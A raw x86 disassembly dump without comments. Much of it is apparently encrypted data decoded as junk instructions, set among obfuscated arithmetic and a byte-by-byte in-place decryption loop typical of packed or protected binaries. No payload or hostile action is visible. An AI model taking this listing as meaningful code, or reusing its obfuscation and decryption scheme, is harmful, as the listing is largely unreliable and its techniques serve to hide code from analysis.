  416409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640a:	pop    ebx
  41640b:	push   ds
  41640c:	(bad)  
  41640d:	mov    ah,0xee
  41640f:	imul   ecx,DWORD PTR ds:0x426e5bfa,0x77
  416416:	cli    
  416417:	imul   ebx,DWORD PTR [esi+0x1064bf46],0x7e
  41641e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41641f:	mov    ch,0xf8
  416421:	or     cl,bh
  416423:	std    
  416424:	loope  0x41642a
  416426:	adc    eax,DWORD PTR ds:0xde2d71d3
  41642c:	lea    ebx,[esi+0x6e]
  41642f:	arpl   WORD PTR [ebx-0x55],dx
  416432:	mov    ebp,0x55fb86bd
  416437:	add    BYTE PTR [ecx],cl
  416439:	and    DWORD PTR [edx+0x68c76f70],edi
  41643f:	mov    ebx,0xe1beb37f
  416444:	mov    eax,0x87a2a63d
  416449:	lock xchg ecx,eax
  41644b:	jnp    0x416486
  41644d:	js     0x41646a
  41644f:	pop    ds
  416450:	loop   0x416407
  416452:	sub    edi,ebx
  416454:	hlt    
  416455:	or     eax,0xd3503694
  41645a:	mov    ebp,0x2225b5b7
  41645f:	ins    BYTE PTR es:[edi],dx
  416460:	mov    ds:0x566c40f6,eax
  416465:	(bad)  
  416466:	loop   0x4164bb
  416468:	retf   
  416469:	mov    ah,0xce
  41646b:	fisttp WORD PTR [edi]
  41646d:	sub    al,0x18
  41646f:	push   0xea97850a
  416474:	loopne 0x41646b
  416476:	jmp    0x869d8aa5
  41647b:	jno    0x416416
  41647d:	out    dx,al
  41647e:	adc    esi,ebp
  416480:	sbb    al,0xbd
  416482:	lahf   
  416483:	je     0x4164a5
  416485:	icebp  
  416486:	or     edi,DWORD PTR [esi-0x1c6202f]
  41648c:	cmp    DWORD PTR [edi+0x34435eec],ebp
  416492:	int    0x22
  416494:	(bad)  
  416495:	push   ds
  416496:	sbb    ecx,edi
  416498:	adc    eax,0x5c18d2e7
  41649d:	fstp   DWORD PTR [ecx+0x76c7f07c]
  4164a3:	jp     0x4164eb
  4164a5:	dec    eax
  4164a6:	sub    eax,0xb06e9d66
  4164ab:	xor    ah,bh
  4164ad:	ins    DWORD PTR es:[edi],dx
  4164ae:	mov    ss,ebp
  4164b0:	xor    eax,0x6a29303
  4164b5:	adc    BYTE PTR ds:0x8ea00db4,dh
  4164bb:	out    dx,eax
  4164bc:	cli    
  4164bd:	jp     0x416532
  4164bf:	xor    BYTE PTR [edx-0x57],cl
  4164c2:	rcr    BYTE PTR [ebp-0x43],cl
  4164c5:	hlt    
  4164c6:	inc    edx
  4164c7:	fstp   DWORD PTR [edi+0x61]
  4164ca:	xchg   edx,eax
  4164cb:	or     ebx,DWORD PTR [ecx+edi*4]
  4164ce:	pop    ds
  4164cf:	icebp  
  4164d0:	call   0xb39b768f
  4164d5:	fucomi st,st(1)
  4164d7:	out    0xca,al
  4164d9:	mov    ds:0xb7cc723d,eax
  4164de:	enter  0x98ad,0x3e
  4164e2:	mov    edi,0xa3501fce
  4164e7:	push   edi
  4164e8:	sbb    BYTE PTR [edx*8+0x39a7fb91],0xb
  4164f0:	sbb    al,BYTE PTR [ebx+edx*1-0x4a9e3522]
  4164f7:	push   cs
  4164f8:	addr16 jnp 0x4164e5
  4164fb:	xchg   edx,eax
  4164fc:	mov    ebx,0x20f4cd6d
  416501:	or     edx,DWORD PTR [ebp-0x4a]
  416504:	mov    esi,ebp
  416506:	jo     0x4164ce
  416508:	imul   edx,DWORD PTR [ecx+0x11],0x4
  41650c:	pusha  
  41650d:	sbb    DWORD PTR [edi],esp
  41650f:	test   al,0xad
  416511:	aad    0xab
  416513:	out    0x85,eax
  416515:	lods   eax,DWORD PTR ds:[esi]
  416516:	fisttp WORD PTR [eax]
  416518:	mov    dl,0xec
  41651a:	hlt    
  41651b:	not    bl
  41651d:	adc    DWORD PTR [edx+0xceade0f],edi
  416523:	in     eax,dx
  416524:	addr16 xchg esp,eax
  416526:	adc    DWORD PTR [edx-0x35943149],0x5a
  41652d:	test   eax,0xa869f869
  416532:	or     BYTE PTR [eax+0x1a],bh
  416535:	cmp    al,0x10
  416537:	in     eax,0x9a
  416539:	arpl   WORD PTR [ecx],bx
  41653b:	mov    al,ds:0xaed7dabd
  416540:	in     eax,dx
  416541:	inc    eax
  416542:	ds push ebx
  416544:	sbb    eax,0x59dbece6
  416549:	inc    eax
  41654a:	leave  
  41654b:	push   ebp
  41654c:	(bad)  
  41654d:	xor    DWORD PTR [ebp-0x1d2bb693],edi
  416553:	stc    
  416554:	xor    DWORD PTR [edx-0x4578d6d7],ecx
  41655a:	and    ah,bl
  41655c:	and    ah,BYTE PTR [edi-0x173e38cd]
  416562:	add    cl,BYTE PTR [ebx]
  416564:	enter  0x8d51,0x45
  416568:	aam    0x50
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x422548
  416605:	mov    edi,0x42248e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x422548
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x7f43c470]
  416729:	mov    al,0x77
  41672b:	cld    
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx+0x10181814],bl
  416733:	mov    ecx,0x4cf02fb3
  416738:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416739:	pop    esp
  41673a:	gs out 0x4b,al
  41673d:	cmp    bh,BYTE PTR [edi-0x5f35656b]
  416743:	psraw  mm6,QWORD PTR [ecx]
  416746:	push   esi
  416747:	sbb    eax,0xafedcde4
  41674c:	cmp    BYTE PTR [edx+ebp*2-0x542ba4b3],bl
  416753:	cmp    al,0x6b
  416755:	jnp    0x4167b8
  416757:	out    0x79,eax
  416759:	mov    ecx,0xbf9d3bf
  41675e:	pop    ss
  41675f:	mov    ecx,0xb0835d98
  416764:	cld    
  416765:	jg     0x4167cd
  416767:	ret    0x3bfd
  41676a:	int3   
  41676b:	sub    BYTE PTR [edx-0xa],0xf1
  41676f:	sbb    ecx,DWORD PTR [eax]
  416771:	pop    edi
  416772:	cmp    DWORD PTR [edx+ebp*2-0x154a8254],eax
  416779:	cmc    
  41677a:	push   ds
  41677b:	mov    ebx,DWORD PTR [edx-0x6481b4a8]
  416781:	mov    al,0x92
  416783:	jb     0x416706
  416785:	mov    bl,0x54
  416787:	xor    al,0xf
  416789:	mov    cl,0x59
  41678b:	(bad)  [esi]
  41678d:	rcr    DWORD PTR [edi+0x69],cl
  416790:	fcmovb st,st(6)
  416792:	dec    esi
  416793:	inc    esp
  416794:	push   eax
  416795:	div    BYTE PTR [esi-0x51d8d918]
  41679b:	mov    ecx,0x1ba09e07
  4167a0:	arpl   bx,bp
  4167a2:	mov    DWORD PTR [ebp-0x3575580f],ebx
  4167a8:	pop    esp
  4167a9:	cmp    al,0xdd
  4167ab:	ret    0xedad
  4167ae:	sbb    eax,0xad6986c0
  4167b3:	sub    al,BYTE PTR [eax-0x28e31703]
  4167b9:	pop    esi
  4167ba:	push   esp
  4167bb:	fstp   TBYTE PTR [ebx-0x49]
  4167be:	cmc    
  4167bf:	addr16 cmc 
  4167c1:	sbb    BYTE PTR ds:0x860b4b37,bh
  4167c7:	push   0x88bae123
  4167cc:	sub    ebx,edi
  4167ce:	xchg   dl,bl
  4167d0:	sbb    DWORD PTR [eax],ebp
  4167d2:	sahf   
  4167d3:	xor    eax,0x4fe3ac8a
  4167d8:	push   esp
  4167d9:	inc    eax
  4167da:	jne    0x4167dd
  4167dc:	jg     0x4167b3
  4167de:	push   es
  4167df:	es daa 
  4167e1:	rcr    DWORD PTR [ebp-0x27],1
  4167e4:	cmp    eax,0x5e6f33f3
  4167e9:	cli    
  4167ea:	sbb    BYTE PTR cs:[edi],0x21
  4167ee:	dec    esi
  4167ef:	add    esi,edx
  4167f1:	into   
  4167f2:	add    BYTE PTR [esi],0xc9
  4167f5:	xor    al,0x18
  4167f7:	pop    ecx
  4167f8:	mov    dh,0xae
  4167fa:	out    dx,al
  4167fb:	cmp    ch,cl
  4167fd:	nop
  4167fe:	jge    0x416853
  416800:	ins    BYTE PTR es:[edi],dx
  416801:	xor    edx,DWORD PTR [ecx]
  416803:	pop    ebp
  416804:	inc    ebp
  416805:	loop   0x416862
  416807:	inc    ecx
  416808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416809:	scas   al,BYTE PTR es:[edi]
  41680a:	adc    eax,0xb0d89827
  41680f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416810:	xchg   edx,eax
  416811:	cld    
  416812:	push   esi
  416813:	shl    BYTE PTR [edi+ecx*1-0x63],1
  416817:	add    BYTE PTR [edx+0x6b08edf9],al
  41681d:	cmp    ax,0xb09c
  416821:	or     DWORD PTR [ebp-0x7e],esp
  416824:	lds    esp,FWORD PTR [esi+ebp*8-0x1a]
  416828:	push   edi
  416829:	out    0xda,al
  41682b:	pushf  
  41682c:	pop    ecx
  41682d:	pop    eax
  41682e:	(bad)  
  41682f:	aad    0x6e
  416831:	add    eax,0xd6bd7f22
  416836:	mov    ch,0xc8
  416838:	ret    0x3913
  41683b:	sub    DWORD PTR [ebx+0x58f334cb],ebx
  416841:	scas   al,BYTE PTR es:[edi]
  416842:	jl     0x416835
  416844:	xor    eax,DWORD PTR [ecx-0x3]
  416847:	nop
  416848:	dec    BYTE PTR [edx]
  41684a:	sti    
  41684b:	(bad)  
  41684c:	fucomp st(5)
  41684e:	pop    edx
  41684f:	rcr    bl,0x49
  416852:	jmp    0x416800
  416854:	sti    
  416855:	or     eax,0x8b84be14
  41685a:	jecxz  0x41689f
  41685c:	inc    esi
  41685d:	and    eax,0x27a5005e
  416862:	lea    edx,[ebx+0x4bb57579]
  416868:	adc    DWORD PTR [esi-0x6d16c729],esp
  41686e:	ret    0xd8d8
  416871:	jl     0x4168ec
  416873:	pop    es
  416874:	or     dh,BYTE PTR [edx]
  416876:	dec    ebx
  416877:	mov    al,0x41
  416879:	pop    esi
  41687a:	into   
  41687b:	sub    al,0xd0
  41687d:	fdiv   QWORD PTR [esp+edi*2+0x3c]
  416881:	or     eax,0xd1de7aed
  416886:	enter  0xebec,0x48
  41688a:	mov    BYTE PTR [ecx+edx*4],cl
  41688d:	mov    ds:0x9c646f9d,al
  416892:	(bad)  
  416893:	lods   al,BYTE PTR ds:[esi]
  416894:	test   al,0x36
  416896:	call   0xab0a2a44
  41689b:	push   edx
  41689c:	sub    al,0x75
  41689e:	sahf   
  41689f:	(bad)  
  4168a0:	mov    ecx,0x24e150f5
  4168a5:	mov    ebx,0x5c8bf534
  4168aa:	popa   
  4168ab:	nop
  4168ac:	lock or dl,bh
  4168af:	bound  eax,QWORD PTR [eax-0x33]
  4168b2:	xchg   ecx,eax
  4168b3:	inc    esp
  4168b4:	popf   
  4168b5:	in     al,dx
  4168b6:	dec    edi
  4168b7:	push   ebx
  4168b8:	push   0x54
  4168ba:	cwde   
  4168bb:	mov    eax,0x432b80b2
  4168c0:	outs   dx,DWORD PTR ds:[esi]
  4168c1:	clc    
  4168c2:	sahf   
  4168c3:	js     0x4168db
  4168c5:	popa   
  4168c6:	push   edx
  4168c7:	inc    eax
  4168c8:	test   ah,dl
  4168ca:	mov    ah,BYTE PTR [ecx-0x5ff2c40f]
  4168d0:	call   0xffdc44d7
  4168d5:	std    
  4168d6:	xchg   esi,eax
  4168d7:	std    
  4168d8:	push   0xada38ed8
  4168dd:	rcl    BYTE PTR [edx-0x19],0x43
  4168e1:	adc    BYTE PTR [eax],dl
  4168e3:	xor    eax,0x511980a9
  4168e8:	addr16 inc edx
  4168ea:	xchg   ecx,eax
  4168eb:	sub    dh,dl
  4168ed:	int3   
  4168ee:	fdiv   st,st(7)
  4168f0:	jl     0x4168ff
  4168f2:	push   ss
  4168f3:	inc    esp
  4168f4:	mov    ebx,DWORD PTR [eax]
  4168f6:	mov    ds:0xfa7cf1ed,eax
  4168fb:	arpl   WORD PTR [esi-0x1c],si
  4168fe:	test   BYTE PTR [eax-0x53],bh
  416901:	push   esi
  416902:	fidiv  WORD PTR [esi+0x2c]
  416905:	push   ss
  416906:	enter  0xbb19,0xf5
  41690a:	sbb    al,0xcc
  41690c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41690d:	pusha  
  41690e:	xor    al,0x40
  416910:	add    bh,BYTE PTR [esi-0x16]
  416913:	scas   eax,DWORD PTR es:[edi]
  416914:	jecxz  0x4168a3
  416916:	adc    BYTE PTR [ecx],cl
  416918:	inc    ebp
  416919:	xchg   ebp,eax
  41691a:	sub    eax,0x3ae919bb
  41691f:	aad    0x4f
  416921:	test   BYTE PTR [ecx-0x18],al
  416924:	mov    ss,edi
  416926:	je     0x4168b4
  416928:	pop    es
  416929:	mov    al,ds:0x797fce85
  41692e:	jmp    0x653c3be4
  416933:	lds    ecx,FWORD PTR [ebx+0x276bd5bc]
  416939:	std    
  41693a:	push   es
  41693b:	dec    edi
  41693c:	sbb    cl,BYTE PTR [edx]
  41693e:	shr    BYTE PTR [ecx+esi*2],0x95
  416942:	mov    ecx,0xf66cc243
  416947:	aaa    
  416948:	fiadd  DWORD PTR [ebx-0x936e0e]
  41694e:	in     eax,0x8a
  416950:	scas   eax,DWORD PTR es:[edi]
  416951:	scas   al,BYTE PTR es:[edi]
  416952:	repnz pop ds
  416954:	jp     0x41690f
  416956:	and    DWORD PTR cs:[esi-0x2d],0xffffffbc
  41695b:	fwait
  41695c:	dec    edi
  41695d:	icebp  
  41695e:	shr    dl,1
  416960:	inc    edx
  416961:	addr16 pop ecx
  416963:	mov    al,0xfd
  416965:	rol    cl,1
  416967:	scas   eax,DWORD PTR es:[edi]
  416968:	mov    ds:0x4f636fe2,al
  41696d:	scas   al,BYTE PTR es:[edi]
  41696e:	cli    
  41696f:	rcl    ecx,1
  416971:	push   eax
  416972:	call   0x50fe:0x458d0eb6
  416979:	mov    eax,DWORD PTR [ebp+0x10]
  41697c:	mov    ecx,DWORD PTR [ebp+0x14]
  41697f:	shrd   eax,ecx,0x2
  416983:	shr    ecx,0x2
  416986:	mov    ecx,DWORD PTR [ebp+0x10]
  416989:	mov    edx,DWORD PTR [ebp+0x14]
  41698c:	xor    eax,esi
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xbc6330bb
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx-0x7e7e7ec],bl
  4169ac:	jge    0x4169f5
  4169ae:	fbld   TBYTE PTR [eax]
  4169b0:	dec    ecx
  4169b1:	add    DWORD PTR [eax+0x6e],ecx
  4169b4:	adc    ebx,esi
  4169b6:	(bad)  
  4169b7:	dec    edx
  4169b8:	mov    al,0x5d
  4169ba:	xor    bl,ah
  4169bc:	pop    ecx
  4169bd:	push   ss
  4169be:	lock addr16 cmp ecx,esi
  4169c2:	dec    eax
  4169c3:	scas   al,BYTE PTR es:[edi]
  4169c4:	(bad)  
  4169c5:	adc    dl,BYTE PTR [ebx+0x2ed8bd51]
  4169cb:	fs cli 
  4169cd:	xchg   BYTE PTR [ecx+0x3c],bh
  4169d0:	mov    al,0xd0
  4169d2:	ror    BYTE PTR [ecx],1
  4169d4:	sub    al,dl
  4169d6:	popf   
  4169d7:	or     al,0x19
  4169d9:	jnp    0x41697c
  4169db:	lock or ebx,DWORD PTR [edi+0x47]
  4169df:	aaa    
  4169e0:	mov    esi,0x52e5ad3a
  4169e5:	fisub  DWORD PTR [eax+esi*4-0x57]
  4169e9:	in     al,0xe9
  4169eb:	inc    BYTE PTR [edi+0x1653577f]
  4169f1:	in     al,0x80
  4169f3:	test   esp,esp
  4169f5:	cmp    cl,BYTE PTR [edi+0x5a]
  4169f8:	je     0x416a37
  4169fa:	scas   eax,DWORD PTR es:[edi]
  4169fb:	adc    dh,0xa9
  4169fe:	test   bh,bh
  416a00:	sub    ebx,DWORD PTR [esi-0x3edb7fe1]
  416a06:	in     eax,0x4b
  416a08:	pop    ebp
  416a09:	pop    edi
  416a0a:	(bad)  
  416a0b:	adc    ah,BYTE PTR [edi]
  416a0d:	jmp    0x4169a8
  416a0f:	mov    dl,0xe3
  416a11:	sbb    BYTE PTR [eax+0x67ed7354],0x30
  416a18:	sub    esi,DWORD PTR [ecx-0x63bb0cad]
  416a1e:	inc    edi
  416a1f:	push   eax
  416a20:	mov    esi,0xaeddedbb
  416a25:	arpl   WORD PTR [edi+0x5c8da4ad],si
  416a2b:	retf   
  416a2c:	mov    ebp,0xaaf4c6f9
  416a31:	cwde   
  416a32:	faddp  st(5),st
  416a34:	and    al,0x30
  416a36:	mov    cl,dl
  416a38:	jl     0x416aa3
  416a3a:	into   
  416a3b:	cmp    bh,bl
  416a3d:	das    
  416a3e:	(bad)  
  416a3f:	jmp    0xd4d7:0xa3619363
  416a46:	loopne 0x416a1e
  416a48:	jg     0x4169ed
  416a4a:	out    dx,al
  416a4b:	inc    esi
  416a4c:	mov    esp,0x72613f01
  416a51:	aad    0xce
  416a53:	mov    ecx,0x8901d5fd
  416a58:	data16 rol BYTE PTR [ebp-0x61b17f5a],cl
  416a5f:	fnstcw WORD PTR [esi+ecx*2-0x5b65c891]
  416a66:	hlt    
  416a67:	mov    dl,0xe5
  416a69:	and    ch,ah
  416a6b:	jle    0x416a57
  416a6d:	jne    0x416ace
  416a6f:	imul   esi,edx,0x3759e2f4
  416a75:	lock cmc 
  416a77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a78:	jecxz  0x416a46
  416a7a:	sub    al,0xfe
  416a7c:	sbb    al,0x70
  416a7e:	lods   eax,DWORD PTR ds:[esi]
  416a7f:	xor    BYTE PTR [edi],al
  416a81:	jle    0x416a94
  416a83:	aam    0x70
  416a85:	mov    edi,0x3b6f867a
  416a8a:	enter  0x79f,0x81
  416a8e:	fdivrp st(2),st
  416a90:	out    dx,eax
  416a91:	jbe    0x416b11
  416a93:	(bad)  
  416a94:	arpl   WORD PTR [ebx-0x1d],bx
  416a97:	xor    al,0x5b
  416a99:	jnp    0x416a75
  416a9b:	mov    cl,dh
  416a9d:	xor    DWORD PTR [eax-0x80],esi
  416aa0:	and    ebp,DWORD PTR [ecx+0x1181d651]
  416aa6:	push   edx
  416aa7:	(bad)  
  416aa9:	inc    edx
  416aaa:	(bad)  
  416aab:	(bad)  
  416aac:	mov    ah,0xf
  416aae:	stos   BYTE PTR es:[edi],al
  416aaf:	jo     0x416a39
  416ab1:	and    al,0xf
  416ab3:	ror    bh,cl
  416ab5:	add    ebx,esi
  416ab7:	push   cs
  416ab8:	in     eax,dx
  416ab9:	cmc    
  416aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416abb:	aam    0xd4
  416abd:	lods   eax,DWORD PTR ds:[esi]
  416abe:	jbe    0x416a95
  416ac0:	xor    cl,ch
  416ac2:	lea    esi,ds:[esi+0x38]
  416ac6:	jb     0x416a94
  416ac8:	push   es
  416ac9:	xor    ebx,eax
  416acb:	and    esp,DWORD PTR [edi-0x3352e4e4]
  416ad1:	repz ret 0x9d3e
  416ad5:	xchg   DWORD PTR [ecx+0x12882a9],eax
  416adb:	push   eax
  416adc:	pop    esi
  416add:	dec    edx
  416ade:	push   0xffffffc4
  416ae0:	jo     0x416b5c
  416ae2:	pop    edi
  416ae3:	jge    0x416b09
  416ae5:	call   DWORD PTR [ecx+0x1a]
  416ae8:	mov    ebp,0x1628b1f4
  416aed:	mov    DWORD PTR ds:[esi],ebp
  416af0:	neg    ebp
  416af2:	clc    
  416af3:	cmp    eax,0x38386309
  416af8:	(bad)  
  416af9:	aad    0x6b
  416afb:	shr    al,0x8f
  416afe:	push   0x1d1c2785
  416b03:	pop    DWORD PTR [ecx+0x1e]
  416b06:	inc    ebx
  416b07:	out    0x43,al
  416b09:	mov    ebp,0x896a9a75
  416b0e:	retf   0x918f
  416b11:	push   0x5b
  416b13:	or     BYTE PTR [ebp-0x30],dh
  416b16:	call   0x8a85b36e
  416b1b:	push   ds
  416b1c:	push   eax
  416b1d:	ficom  DWORD PTR [esp+eiz*8+0x7f5eed9d]
  416b24:	addr16 loopne 0x416b65
  416b27:	test   BYTE PTR [ebp+0x5b0dd7e3],ah
  416b2d:	loope  0x416b0e
  416b2f:	les    esp,FWORD PTR [edx+0xb]
  416b32:	or     DWORD PTR [esi],0x46f9a551
  416b38:	inc    ebp
  416b39:	retf   
  416b3a:	mov    dl,0xda
  416b3c:	mov    esp,0x9a881131
  416b41:	xor    al,0xfa
  416b43:	ja     0x416b6f
  416b45:	imul   ebp,DWORD PTR [edi+0x61c4e443],0x1a
  416b4c:	or     al,0x6a
  416b4e:	lds    edx,FWORD PTR [esi+0x4c]
  416b51:	jl     0x416b8f
  416b53:	or     al,0xf8
  416b55:	call   0xeb6de34b
  416b5a:	adc    BYTE PTR [esi],bh
  416b5c:	popa   
  416b5d:	cmp    bh,bl
  416b5f:	dec    ebx
  416b60:	outs   dx,BYTE PTR ds:[esi]
  416b61:	jmp    0x19c4caf0
  416b66:	and    eax,0x4992ace4
  416b6b:	fwait
  416b6c:	aad    0x3b
  416b6e:	push   0xffffffca
  416b70:	es mov edx,0x40fa608e
  416b76:	or     eax,0x5fcb5457
  416b7b:	add    DWORD PTR [ebx],esi
  416b7d:	xchg   edx,eax
  416b7e:	cmp    esi,DWORD PTR [ebx+ebp*4]
  416b81:	cmp    bl,cl
  416b83:	adc    eax,0x329d307c
  416b88:	mov    ecx,0x59e1f858
  416b8d:	cmp    DWORD PTR [edi],ebp
  416b8f:	xor    eax,0x5f65dd7b
  416b94:	xor    bh,bl
  416b96:	leave  
  416b97:	icebp  
  416b98:	cmp    DWORD PTR [esi+edx*2+0x4cab56f8],esp
  416b9f:	cmc    
  416ba0:	cli    
  416ba1:	fs mov bl,0x87
  416ba4:	push   esi
  416ba5:	add    ah,dh
  416ba7:	push   ecx
  416ba8:	jmp    0x416b7f
  416baa:	mov    edx,esp
  416bac:	push   edx
  416bad:	rcr    BYTE PTR [edx-0x7c8aba77],1
  416bb3:	and    BYTE PTR ds:0x7d14dd46,dh
  416bb9:	or     ecx,DWORD PTR [edx-0xd]
  416bbc:	mov    esp,0xe8a3b7c6
  416bc1:	inc    ebp
  416bc2:	iret   
  416bc3:	scas   eax,DWORD PTR es:[edi]
  416bc4:	push   eax
  416bc5:	adc    al,0x51
  416bc7:	pop    DWORD PTR [edx-0x26]
  416bca:	iret   
  416bcb:	add    bh,ah
  416bcd:	stos   DWORD PTR es:[edi],eax
  416bce:	xor    bl,BYTE PTR [ebx-0x22525829]
  416bd4:	mul    DWORD PTR [ebx]
  416bd6:	xor    BYTE PTR [edi-0x7b],cl
  416bd9:	call   0xa41353ad
  416bde:	mov    gs,WORD PTR [eax-0x4b2ab67e]
  416be4:	stos   BYTE PTR es:[edi],al
  416be5:	push   edi
  416be6:	push   ebp
  416be7:	shr    BYTE PTR [esi+0x2c],0x19
  416beb:	pop    edi
  416bec:	jnp    0x416be9
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
